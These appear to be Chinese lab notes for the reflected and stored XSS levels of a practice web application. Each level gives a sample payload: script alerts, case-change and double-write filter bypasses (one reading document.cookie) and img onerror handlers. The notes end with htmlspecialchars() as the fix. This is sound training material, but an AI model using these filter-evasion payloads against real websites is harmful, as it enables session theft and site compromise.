# 反射型

##  Low  

```javascript
<script>alert('xss')</script>
```

## Midum

**大小写**或者**双写**绕过 

```javascript
<Script>alert('xss')</script>
```

```javascript
<s<script>cript>alert(document.cookie)</script>
```

## High

其他标签绕过 

```javascript
<img src="" οnerrοr="alert('xss')">
```

##  Impossible 

使用**htmlspecialchars()**函数，把相应字符转换为 **实体字符** 

# 存储型XSS

## Low 

```javascript
<script>alert('xss')</script>
```

##  Midum



```javascript
<Script>alert(/xss/)</Script>
```

## High 

```
<img src=1 οnerrοr=alert(/XSS/)>
```

## Impossible

 使用htmlspecialchars函数，把相应字符转换为实体字符